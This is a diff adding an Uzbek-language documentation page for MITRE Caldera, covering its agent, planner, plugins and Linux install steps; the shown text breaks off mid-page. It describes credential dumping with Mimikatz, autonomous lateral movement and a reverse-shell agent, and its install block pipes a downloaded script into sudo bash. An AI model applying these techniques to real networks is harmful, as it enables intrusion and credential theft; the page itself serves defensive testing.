@@ -1,0 +1,1153 @@
+<!DOCTYPE html>
+<html lang="uz" class="dark scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MITRE Caldera™ — To'liq Texnik Qo'llanma va Arxitektura</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        cyber: {
+                            bg: '#090d16',
+                            card: '#111827',
+                            border: '#1f2937',
+                            red: '#ef4444',
+                            cyan: '#06b6d4',
+                            emerald: '#10b981',
+                            amber: '#f59e0b',
+                            purple: '#8b5cf6'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #090d16;
+            color: #e2e8f0;
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(239, 68, 68, 0.08) 0px, transparent 50%),
+                radial-gradient(at 100% 0%, rgba(6, 182, 212, 0.08) 0px, transparent 50%),
+                radial-gradient(at 50% 100%, rgba(16, 185, 129, 0.05) 0px, transparent 50%);
+            background-attachment: fixed;
+        }
+        .cyber-grid {
+            background-size: 40px 40px;
+            background-image: 
+                linear-gradient(to right, rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+        }
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #090d16;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1e293b;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #334155;
+        }
+        .glow-red {
+            box-shadow: 0 0 25px -5px rgba(239, 68, 68, 0.25);
+        }
+        .glow-cyan {
+            box-shadow: 0 0 25px -5px rgba(6, 182, 212, 0.25);
+        }
+        .glow-emerald {
+            box-shadow: 0 0 25px -5px rgba(16, 185, 129, 0.25);
+        }
+        @keyframes pulse-slow {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+        .animate-pulse-slow {
+            animation: pulse-slow 3s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+    </style>
+</head>
+<body class="cyber-grid antialiased selection:bg-red-500/30 selection:text-red-200">
+
+    <!-- Toast Notification -->
+    <div id="toast" class="fixed bottom-5 right-5 z-50 transform translate-y-20 opacity-0 transition-all duration-300 pointer-events-none bg-slate-900/95 border border-emerald-500/50 text-emerald-300 px-4 py-3 rounded-xl shadow-2xl flex items-center gap-3 backdrop-blur-md">
+        <svg class="w-5 h-5 text-emerald-400 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+        <span id="toast-msg" class="text-sm font-mono font-medium">Buyruq nusxalandi!</span>
+    </div>
+
+    <!-- Top Navigation Bar -->
+    <header class="sticky top-0 z-40 backdrop-blur-xl bg-[#090d16]/85 border-b border-slate-800/80">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-red-600 to-rose-900 flex items-center justify-center shadow-lg shadow-red-600/20 border border-red-500/30">
+                    <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                    </svg>
+                </div>
+                <div>
+                    <div class="flex items-center gap-2">
+                        <span class="font-bold text-lg tracking-tight text-white">MITRE CALDERA™</span>
+                        <span class="text-[11px] font-mono uppercase px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 border border-red-500/20">v5.0+ Docs</span>
+                    </div>
+                    <p class="text-xs text-slate-400 hidden sm:block">Avtomatlashtirilgan Adversary Emulation va C2 Tizimi</p>
+                </div>
+            </div>
+
+            <!-- Quick Navigation Links -->
+            <nav class="hidden lg:flex items-center gap-1 text-sm font-medium text-slate-300">
+                <a href="#umumiy" class="px-3 py-2 rounded-lg hover:bg-slate-800/70 hover:text-white transition">1. Tizim & Arxitektura</a>
+                <a href="#ornatish" class="px-3 py-2 rounded-lg hover:bg-slate-800/70 hover:text-white transition">2. O'rnatish</a>
+                <a href="#imkoniyatlar" class="px-3 py-2 rounded-lg hover:bg-slate-800/70 hover:text-white transition">3. Imkoniyatlar</a>
+                <a href="#c2-farqi" class="px-3 py-2 rounded-lg hover:bg-slate-800/70 hover:text-white transition">4. C2 dan Farqi</a>
+                <a href="#samaradorlik" class="px-3 py-2 rounded-lg hover:bg-slate-800/70 hover:text-white transition">5. Samaradorlik</a>
+                <a href="#opsec-stealth" class="px-3 py-2 rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 hover:bg-emerald-500/20 transition">6. Shovqinsiz (OPSEC)</a>
+            </nav>
+
+            <!-- Mobile Menu Button -->
+            <button id="mobile-menu-btn" class="lg:hidden p-2 rounded-lg bg-slate-800/80 text-slate-300 hover:text-white border border-slate-700">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+                </svg>
+            </button>
+        </div>
+
+        <!-- Mobile Menu Dropdown -->
+        <div id="mobile-menu" class="hidden lg:hidden bg-slate-900 border-b border-slate-800 px-4 pt-2 pb-4 space-y-1 text-sm">
+            <a href="#umumiy" class="block px-3 py-2 rounded-lg hover:bg-slate-800 text-slate-300">1. Umumiy Tizim va Arxitektura</a>
+            <a href="#ornatish" class="block px-3 py-2 rounded-lg hover:bg-slate-800 text-slate-300">2. O'rnatish Qo'llanmasi</a>
+            <a href="#imkoniyatlar" class="block px-3 py-2 rounded-lg hover:bg-slate-800 text-slate-300">3. Nimalar Qila Oladi?</a>
+            <a href="#c2-farqi" class="block px-3 py-2 rounded-lg hover:bg-slate-800 text-slate-300">4. An'anaviy C2 dan Farqi</a>
+            <a href="#samaradorlik" class="block px-3 py-2 rounded-lg hover:bg-slate-800 text-slate-300">5. Samaradorlik va Baholash</a>
+            <a href="#opsec-stealth" class="block px-3 py-2 rounded-lg bg-emerald-500/10 text-emerald-400 font-semibold">6. Shovqinsiz Kirish va OPSEC</a>
+        </div>
+    </header>
+
+    <!-- Main Content Container -->
+    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10 space-y-20">
+
+        <!-- HERO SECTION -->
+        <section class="relative rounded-3xl bg-gradient-to-b from-slate-900/90 to-[#0c1220] border border-slate-800 p-6 sm:p-10 lg:p-12 overflow-hidden shadow-2xl">
+            <div class="absolute -right-20 -top-20 w-96 h-96 bg-red-600/10 rounded-full blur-3xl pointer-events-none"></div>
+            <div class="absolute -left-20 -bottom-20 w-96 h-96 bg-cyan-600/10 rounded-full blur-3xl pointer-events-none"></div>
+
+            <div class="relative z-10 grid grid-cols-1 lg:grid-cols-12 gap-8 items-center">
+                <div class="lg:col-span-7 space-y-6">
+                    <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-mono">
+                        <span class="w-2 h-2 rounded-full bg-red-500 animate-ping"></span>
+                        MITRE ATT&CK® ASOSIDAGI AVTOMATLASHTIRILGAN PLATFORM
+                    </div>
+                    <h1 class="text-3xl sm:text-5xl font-extrabold text-white tracking-tight leading-tight">
+                        MITRE <span class="text-transparent bg-clip-text bg-gradient-to-r from-red-500 via-rose-400 to-amber-400">Caldera™</span> Nima va U Qanday Ishlaydi?
+                    </h1>
+                    <p class="text-slate-300 text-base sm:text-lg leading-relaxed">
+                        <strong class="text-white">MITRE Caldera</strong> — bu kiberxavfsizlik bo'yicha mutaxassislar (Red Team, Blue Team va Purple Team) uchun MITRE korporatsiyasi tomonidan ishlab chiqilgan <span class="text-cyan-400 font-medium">Avtomatlashtirilgan Xakerlar Emulyatsiyasi (Automated Adversary Emulation)</span> freymvorkidir. U real APT guruhlarining xatti-harakatlarini MITRE ATT&CK matritsasi asosida inson aralashuvisiz, avtonom tarzda tarmoq ichida bajarish va himoya tizimlarini (SIEM, EDR, SOC) tekshirish uchun mo'ljallangan.
+                    </p>
+                    
+                    <div class="flex flex-wrap gap-3 pt-2">
+                        <a href="#ornatish" class="px-5 py-3 rounded-xl bg-red-600 hover:bg-red-500 text-white font-semibold text-sm transition flex items-center gap-2 shadow-lg shadow-red-600/25">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                            O'rnatishga o'tish
+                        </a>
+                        <a href="#opsec-stealth" class="px-5 py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-emerald-400 border border-emerald-500/30 font-semibold text-sm transition flex items-center gap-2">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                            Shovqinsiz Kirish (Stealth Simulyator)
+                        </a>
+                        <a href="#c2-farqi" class="px-5 py-3 rounded-xl bg-slate-800/60 hover:bg-slate-800 text-slate-300 border border-slate-700 font-medium text-sm transition">
+                            C2 vs Caldera taqqoslash
+                        </a>
+                    </div>
+                </div>
+
+                <!-- Summary Stats / Highlights Card -->
+                <div class="lg:col-span-5 grid grid-cols-2 gap-4">
+                    <div class="bg-slate-900/90 border border-slate-800 p-5 rounded-2xl space-y-2">
+                        <div class="text-xs font-mono text-slate-400 uppercase">Asosiy Arxitektura</div>
+                        <div class="text-2xl font-bold text-white">Core + Plugins</div>
+                        <p class="text-xs text-slate-400 leading-relaxed">Python (aiohttp) server, REST API va kengaytiriladigan plaginlar tizimi (Sandcat, Stockpile, Manx).</p>
+                    </div>
+                    <div class="bg-slate-900/90 border border-slate-800 p-5 rounded-2xl space-y-2">
+                        <div class="text-xs font-mono text-slate-400 uppercase">Qaror Qabul Qilish</div>
+                        <div class="text-2xl font-bold text-cyan-400">Fact-Graph AI</div>
+                        <p class="text-xs text-slate-400 leading-relaxed">Topilgan parollar, IP va foydalanuvchilar (Facts) asosida keyingi hujumni o'zi mantiqan tanlaydi.</p>
+                    </div>
+                    <div class="bg-slate-900/90 border border-slate-800 p-5 rounded-2xl space-y-2">
+                        <div class="text-xs font-mono text-slate-400 uppercase">Qo'llab-quvvatlash</div>
+                        <div class="text-2xl font-bold text-emerald-400">Cross-Platform</div>
+                        <p class="text-xs text-slate-400 leading-relaxed">Windows, Linux va macOS tizimlarida Golang (Sandcat) yoki Python/Shell orqali ishlaydi.</p>
+                    </div>
+                    <div class="bg-slate-900/90 border border-slate-800 p-5 rounded-2xl space-y-2">
+                        <div class="text-xs font-mono text-slate-400 uppercase">Aloqa Protokollari</div>
+                        <div class="text-2xl font-bold text-amber-400">Multi-Contact</div>
+                        <p class="text-xs text-slate-400 leading-relaxed">HTTP/S, TCP, UDP, WebSocket, DNS tunnelling, GitHub Gist va SSH Lateral Movement.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 1: UMUMIY TIZIM VA ARXITEKTURA -->
+        <section id="umumiy" class="space-y-8 scroll-mt-20">
+            <div class="flex flex-col md:flex-row md:items-end justify-between border-b border-slate-800 pb-4 gap-4">
+                <div>
+                    <span class="text-xs font-mono uppercase tracking-wider text-red-400">01-Bo'lim // Tizim Tuzilishi</span>
+                    <h2 class="text-2xl sm:text-3xl font-bold text-white mt-1">Umumiy Tizim Qanday Ishlaydi? (Ichki Arxitektura)</h2>
+                </div>
+                <p class="text-sm text-slate-400 max-w-md">Caldera ikki asosiy qismdan iborat: <strong class="text-slate-200">The Core System (Asosiy yadro)</strong> va <strong class="text-slate-200">Plugins (Plaginlar ekotizimi)</strong>.</p>
+            </div>
+
+            <!-- Interactive Architecture Flow Diagram -->
+            <div class="bg-slate-900/70 border border-slate-800 rounded-2xl p-6 sm:p-8">
+                <h3 class="text-base font-semibold text-white mb-6 flex items-center gap-2">
+                    <span class="w-2.5 h-2.5 rounded-full bg-cyan-400"></span>
+                    Avtonom Operatsiya Zanjiri (Qanday qilib Caldera o'zi hujum qiladi?)
+                </h3>
+                
+                <div class="grid grid-cols-1 md:grid-cols-5 gap-4 relative">
+                    <!-- Step 1 -->
+                    <div class="bg-[#0b101c] border border-slate-800 hover:border-red-500/50 transition p-4 rounded-xl flex flex-col justify-between">
+                        <div>
+                            <div class="flex items-center justify-between mb-2">
+                                <span class="text-xs font-mono px-2 py-0.5 rounded bg-red-500/10 text-red-400">1-QADAM</span>
+                                <span class="text-xs font-mono text-slate-500">Agent</span>
+                            </div>
+                            <h4 class="font-bold text-white text-sm mb-1">Agent (Sandcat)</h4>
+                            <p class="text-xs text-slate-400 leading-relaxed">Nishon kompyuterga tushirilgan dastur (implant). U C2 serverga har X soniyada (masalan, 30-60s) aloqaga chiqadi (<code class="text-cyan-300">beacon</code>) va buyruq kutadi.</p>
+                        </div>
+                        <div class="mt-3 pt-2 border-t border-slate-800/80 text-[11px] font-mono text-slate-500">MITRE: C2 Channel</div>
+                    </div>
+
+                    <!-- Step 2 -->
+                    <div class="bg-[#0b101c] border border-slate-800 hover:border-amber-500/50 transition p-4 rounded-xl flex flex-col justify-between">
+                        <div>
+                            <div class="flex items-center justify-between mb-2">
+                                <span class="text-xs font-mono px-2 py-0.5 rounded bg-amber-500/10 text-amber-400">2-QADAM</span>
+                                <span class="text-xs font-mono text-slate-500">TTPs</span>
+                            </div>
+                            <h4 class="font-bold text-white text-sm mb-1">Ability (Qobiliyat)</h4>
+                            <p class="text-xs text-slate-400 leading-relaxed">Aniq bitta MITRE ATT&CK texnikasini bajaruvchi buyruq (masalan: <code class="text-amber-300">T1003</code> LSASS xotirasidan parolni olish yoki <code class="text-amber-300">whoami</code>).</p>
+                        </div>
+                        <div class="mt-3 pt-2 border-t border-slate-800/80 text-[11px] font-mono text-slate-500">YAML / Executor (psh, sh)</div>
+                    </div>
+
+                    <!-- Step 3 -->
+                    <div class="bg-[#0b101c] border border-slate-800 hover:border-purple-500/50 transition p-4 rounded-xl flex flex-col justify-between">
+                        <div>
+                            <div class="flex items-center justify-between mb-2">
+                                <span class="text-xs font-mono px-2 py-0.5 rounded bg-purple-500/10 text-purple-400">3-QADAM</span>
+                                <span class="text-xs font-mono text-slate-500">APT</span>
+                            </div>
+                            <h4 class="font-bold text-white text-sm mb-1">Adversary Profile</h4>
+                            <p class="text-xs text-slate-400 leading-relaxed">Bir nechta Ability'larning to'plami. Masalan, "APT29" yoki "Ransomware" profili razvedka, huquqni oshirish va shifrlash qobiliyatlarini birlashtiradi.</p>
+                        </div>
+                        <div class="mt-3 pt-2 border-t border-slate-800/80 text-[11px] font-mono text-slate-500">Threat Actor Profile</div>
+                    </div>
+
+                    <!-- Step 4 -->
+                    <div class="bg-[#0b101c] border border-slate-800 hover:border-cyan-500/50 transition p-4 rounded-xl flex flex-col justify-between">
+                        <div>
+                            <div class="flex items-center justify-between mb-2">
+                                <span class="text-xs font-mono px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-400">4-QADAM</span>
+                                <span class="text-xs font-mono text-slate-500">Brain</span>
+                            </div>
+                            <h4 class="font-bold text-white text-sm mb-1">Facts & Parsers</h4>
+                            <p class="text-xs text-slate-400 leading-relaxed">Buyruq natijasidan (Output) parserlar avtomatik <strong class="text-white">Fact</strong> ajratib oladi. Masalan: <code class="text-cyan-300">host.user.name = admin</code> yoki <code class="text-cyan-300">domain.hash = ...</code></p>
+                        </div>
+                        <div class="mt-3 pt-2 border-t border-slate-800/80 text-[11px] font-mono text-slate-500">Knowledge Graph</div>
+                    </div>
+
+                    <!-- Step 5 -->
+                    <div class="bg-[#0b101c] border border-slate-800 hover:border-emerald-500/50 transition p-4 rounded-xl flex flex-col justify-between">
+                        <div>
+                            <div class="flex items-center justify-between mb-2">
+                                <span class="text-xs font-mono px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400">5-QADAM</span>
+                                <span class="text-xs font-mono text-slate-500">Logic</span>
+                            </div>
+                            <h4 class="font-bold text-white text-sm mb-1">Planner (Mantiqiy Miya)</h4>
+                            <p class="text-xs text-slate-400 leading-relaxed">Yig'ilgan Fact'larga qarab keyingi qadamni hal qiladi. Agar yangi kompyuter IP'si va parol topilsa, Planner o'sha kompyuterga avtomatik ko'chib o'tadi!</p>
+                        </div>
+                        <div class="mt-3 pt-2 border-t border-slate-800/80 text-[11px] font-mono text-slate-500">Atomic / Lookahead / Batch</div>
+                    </div>
+                </div>
+
+                <!-- Example Fact Chaining Explanation -->
+                <div class="mt-6 bg-slate-950/90 border border-slate-800/90 rounded-xl p-4 flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4">
+                    <div class="space-y-1">
+                        <div class="text-xs font-mono text-cyan-400 uppercase font-semibold">Misol: Avtonom Zanjir (Fact-Based Chaining) Qanday Ishlaydi?</div>
+                        <p class="text-xs sm:text-sm text-slate-300">
+                            1-buyruq (<code class="text-amber-300">arp -a</code>) tarmoqdagi <code class="text-emerald-300">192.168.1.50</code> IP manzilini topadi va uni <code class="text-cyan-300">remote.host.ip</code> fakti sifatida saqlaydi. 2-buyruq (<code class="text-amber-300">Mimikatz</code>) administrator parolini topib, <code class="text-cyan-300">user.password</code> faktiga yozadi. <strong class="text-white">Planner</strong> bu ikki faktni ko'rgach, avtomatik ravishda 3-buyruq (<code class="text-amber-300">WinRM / SMB Copy Sandcat</code>) orqali <code class="text-emerald-300">192.168.1.50</code> kompyuteriga agentni ko'chirib o'tkazadi (Lateral Movement) — <span class="text-red-400 underline">operator klaviaturaga qo'l tekkizmasdan!</span>
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Core Plugins Grid -->
+            <div>
+                <h3 class="text-lg font-bold text-white mb-4">Caldera-ning Eng Muhim Plaginlari (Rasmiy Ekotizim)</h3>
+                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                    <div class="bg-slate-900/60 border border-slate-800 p-4 rounded-xl hover:border-slate-700 transition">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="font-mono font-bold text-red-400">Sandcat (54ndc47)</span>
+                            <span class="text-[10px] font-mono bg-slate-800 px-2 py-0.5 rounded text-slate-300">Default Agent</span>
+                        </div>
+                        <p class="text-xs text-slate-400">Go (Golang) tilida yozilgan asosiy C2 agent. Har qanday OT da qo'shimcha kutubxonalarsiz ishlaydi, dinamik kompilatsiya qilinadi.</p>
+                    </div>
+                    <div class="bg-slate-900/60 border border-slate-800 p-4 rounded-xl hover:border-slate-700 transition">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="font-mono font-bold text-amber-400">Stockpile</span>
+                            <span class="text-[10px] font-mono bg-slate-800 px-2 py-0.5 rounded text-slate-300">TTPs Ombori</span>
+                        </div>
+                        <p class="text-xs text-slate-400">Yuzlab tayyor Ability'lar (hujum buyruqlari), Adversary profillari va Plannerlarni o'z ichiga olgan rasmiy baza.</p>
+                    </div>
+                    <div class="bg-slate-900/60 border border-slate-800 p-4 rounded-xl hover:border-slate-700 transition">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="font-mono font-bold text-cyan-400">Manx & Ragdoll</span>
+                            <span class="text-[10px] font-mono bg-slate-800 px-2 py-0.5 rounded text-slate-300">Maxsus Agentlar</span>
+                        </div>
+                        <p class="text-xs text-slate-400"><strong>Manx:</strong> TCP orqali interaktiv reverse-shell beruvchi agent. <strong>Ragdoll:</strong> Python asosidagi HTML/veb-sahifa orqali yashirin aloqa qiluvchi agent.</p>
+                    </div>
+                    <div class="bg-slate-900/60 border border-slate-800 p-4 rounded-xl hover:border-slate-700 transition">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="font-mono font-bold text-emerald-400">Atomic & Emu</span>
+                            <span class="text-[10px] font-mono bg-slate-800 px-2 py-0.5 rounded text-slate-300">Integratsiya</span>
+                        </div>
+                        <p class="text-xs text-slate-400"><strong>Atomic:</strong> Red Canary-ning Atomic Red Team testlarini Caldera-ga import qiladi. <strong>Emu:</strong> MITRE CTID real APT emulyatsiya planlarini qo'shadi.</p>
+                    </div>
+                    <div class="bg-slate-900/60 border border-slate-800 p-4 rounded-xl hover:border-slate-700 transition">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="font-mono font-bold text-purple-400">Compass</span>
+                            <span class="text-[10px] font-mono bg-slate-800 px-2 py-0.5 rounded text-slate-300">ATT&CK Navigator</span>
+                        </div>
+                        <p class="text-xs text-slate-400">MITRE ATT&CK Navigator qatlamlarini vizualizatsiya qilish va tanlangan texnikalar asosida bir tugma bilan Adversary yaratish.</p>
+                    </div>
+                    <div class="bg-slate-900/60 border border-slate-800 p-4 rounded-xl hover:border-slate-700 transition">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="font-mono font-bold text-rose-400">Debrief</span>
+                            <span class="text-[10px] font-mono bg-slate-800 px-2 py-0.5 rounded text-slate-300">Hisobot & Grafik</span>
+                        </div>
+                        <p class="text-xs text-slate-400">Operatsiya yakunlangach, barcha qadamlar, topilgan faktlar va hujum grafigini PDF hamda JSON formatida chiroyli hisobot qilib chiqaradi.</p>
+                    </div>
+                    <div class="bg-slate-900/60 border border-slate-800 p-4 rounded-xl hover:border-slate-700 transition">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="font-mono font-bold text-blue-400">Response</span>
+                            <span class="text-[10px] font-mono bg-slate-800 px-2 py-0.5 rounded text-slate-300">Blue Team / EDR</span>
+                        </div>
+                        <p class="text-xs text-slate-400">Faqat hujum emas, balki avtomatlashtirilgan Incident Response (himoya, jarayonlarni o'ldirish, log yig'ish) agentlarini boshqarish plagini.</p>
+                    </div>
+                    <div class="bg-slate-900/60 border border-slate-800 p-4 rounded-xl hover:border-slate-700 transition">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="font-mono font-bold text-teal-400">Builder</span>
+                            <span class="text-[10px] font-mono bg-slate-800 px-2 py-0.5 rounded text-slate-300">Dynamic Compile</span>
+                        </div>
+                        <p class="text-xs text-slate-400">C#, C/C++ va Go kodlarini Docker konteyner ichida on-the-fly (dinamik) kompilatsiya qilib, nishonga yuborish imkonini beradi.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 2: O'RNATISH BO'YICHA QO'LLANMA -->
+        <section id="ornatish" class="space-y-6 scroll-mt-20">
+            <div class="flex flex-col md:flex-row md:items-end justify-between border-b border-slate-800 pb-4 gap-4">
+                <div>
+                    <span class="text-xs font-mono uppercase tracking-wider text-cyan-400">02-Bo'lim // Amaliy O'rnatish</span>
+                    <h2 class="text-2xl sm:text-3xl font-bold text-white mt-1">MITRE Caldera Qanday O'rnatiladi? (Step-by-Step)</h2>
+                </div>
+                <!-- Installation Mode Tabs -->
+                <div class="flex bg-slate-900 p-1 rounded-xl border border-slate-800 self-start">
+                    <button onclick="switchInstallTab('linux')" id="tab-btn-linux" class="px-4 py-1.5 rounded-lg text-xs font-mono font-semibold bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 transition">
+                        Ubuntu / Kali Linux (Native)
+                    </button>
+                    <button onclick="switchInstallTab('docker')" id="tab-btn-docker" class="px-4 py-1.5 rounded-lg text-xs font-mono font-semibold text-slate-400 hover:text-white transition">
+                        Docker (Konteyner)
+                    </button>
+                    <button onclick="switchInstallTab('prod')" id="tab-btn-prod" class="px-4 py-1.5 rounded-lg text-xs font-mono font-semibold text-slate-400 hover:text-white transition">
+                        Production & SSL
+                    </button>
+                </div>
+            </div>
+
+            <!-- System Requirements Banner -->
+            <div class="bg-slate-900/50 border border-slate-800 rounded-xl p-4 flex flex-wrap items-center justify-between gap-4 text-xs">
+                <div class="flex items-center gap-2 text-slate-300">
+                    <svg class="w-4 h-4 text-amber-400 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    <span><strong>Minimal tizim talablari:</strong> Linux yoki macOS, Python 3.9+ (3.10/3.11 tavsiya etiladi), NodeJS v18+ (VueJS UI build uchun), Golang 1.19+ (Sandcat agentni kompilatsiya qilish uchun), 8 GB RAM, 2+ CPU.</span>
+                </div>
+            </div>
+
+            <!-- TAB 1: Native Linux Install -->
+            <div id="install-tab-linux" class="space-y-4">
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <!-- Step 1 & 2 -->
+                    <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 space-y-4">
+                        <div class="flex items-center justify-between">
+                            <span class="text-sm font-bold text-white">1. Kerakli paketlar (Python, Go, Node.js) o'rnatish</span>
+                            <button onclick="copyCode('cmd-prereq')" class="text-xs font-mono px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-cyan-400 border border-slate-700 transition">Nusxalash</button>
+                        </div>
+                        <p class="text-xs text-slate-400">Sandcat va boshqa agentlar dinamik kompilatsiya bo'lishi uchun <code class="text-amber-300">golang-go</code> va Caldera v5.0+ ning Magma (Vue3) interfeysini yig'ish uchun <code class="text-amber-300">nodejs</code> shart.</p>
+                        <pre id="cmd-prereq" class="bg-slate-950 border border-slate-800/80 rounded-xl p-4 text-xs font-mono text-emerald-300 overflow-x-auto leading-relaxed">sudo apt update &amp;&amp; sudo apt upgrade -y
+sudo apt install -y git python3 python3-pip python3-venv golang-go curl build-essential upx-ucl
+
+# NodeJS 20.x o'rnatish (Caldera v5 Magma UI uchun zarur)
+curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+sudo apt install -y nodejs</pre>
+                    </div>
+
+                    <!-- Step 3 & 4 -->
+                    <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 space-y-4">
+                        <div class="flex items-center justify-between">
+                            <span class="text-sm font-bold text-white">2. Repozitoriyani <code class="text-red-400">--recursive</code> bilan klonlash</span>
+                            <button onclick="copyCode('cmd-clone')" class="text-xs font-mono px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-cyan-400 border border-slate-700 transition">Nusxalash</button>
+                        </div>
+                        <p class="text-xs text-slate-400"><strong class="text-red-400">DIQQAT:</strong> <code class="text-white">--recursive</code> bayrog'ini unutish eng ko'p uchraydigan xatodir! Plaginlar (Sandcat, Stockpile) alohida Git submodule bo'lgani uchun bu bayroqsiz plaginlar bo'sh keladi.</p>
+                        <pre id="cmd-clone" class="bg-slate-950 border border-slate-800/80 rounded-xl p-4 text-xs font-mono text-emerald-300 overflow-x-auto leading-relaxed"># Barcha plaginlar bilan birga yuklab olish
+git clone https://github.com/mitre/caldera.git --recursive
+cd caldera
+
+# Agar --recursive unutilgan bo'lsa, quyidagini bajaring:
+git submodule update --init --recursive</pre>
+                    </div>
+
+                    <!-- Step 5 & 6 -->
+                    <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 space-y-4 lg:col-span-2">
+                        <div class="flex items-center justify-between">
+                            <span class="text-sm font-bold text-white">3. Virtual muhit yaratish va Serverni ishga tushirish</span>
+                            <button onclick="copyCode('cmd-run')" class="text-xs font-mono px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-cyan-400 border border-slate-700 transition">Nusxalash</button>
+                        </div>
+                        <p class="text-xs text-slate-400">Caldera v5.0 da birinchi marta ishga tushirganda <code class="text-cyan-300">--build</code> bayrog'i berilishi shart — u VueJS frontend va hujjatlarni avtomatik yig'ib beradi.</p>
+                        <pre id="cmd-run" class="bg-slate-950 border border-slate-800/80 rounded-xl p-4 text-xs font-mono text-emerald-300 overflow-x-auto leading-relaxed"># Python Virtual Environment yaratish va faollashtirish
+python3 -m venv venv
+source venv/bin/activate
+
+# Python kutubxonalarini o'rnatish
+pip install --upgrade pip
+pip install -r requirements.txt
+
+# Birinchi marta ishga tushirish (UI build qilish bilan)
+python3 server.py --build
+
+# Keyingi safarlar tez ishga tushirish uchun:
+python3 server.py</pre>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-3 pt-2">
+                            <div class="bg-slate-950/90 border border-slate-800 p-3 rounded-xl">
+                                <span class="text-[11px] font-mono text-slate-400 block">Web Interfeys Manzili:</span>
+                                <code class="text-sm font-mono text-cyan-400 font-bold">http://127.0.0.1:8888</code>
+                            </div>
+                            <div class="bg-slate-950/90 border border-slate-800 p-3 rounded-xl">
+                                <span class="text-[11px] font-mono text-slate-400 block">Standart Loginlar:</span>
+                                <code class="text-sm font-mono text-red-400 font-bold">red</code> yoki <code class="text-sm font-mono text-blue-400 font-bold">blue</code> / <code class="text-sm font-mono text-amber-300">admin</code>
+                            </div>
+                            <div class="bg-slate-950/90 border border-slate-800 p-3 rounded-xl">
